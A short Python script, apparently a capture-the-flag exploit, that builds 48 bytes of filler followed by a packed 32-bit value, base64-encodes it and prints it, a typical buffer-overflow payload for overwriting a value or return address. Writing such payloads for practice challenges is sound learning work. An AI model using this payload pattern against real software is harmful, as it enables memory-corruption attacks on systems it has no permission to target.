
import sys
import struct
import base64

buf = b'OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO'
buf += struct.pack('<I', 2956628105)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
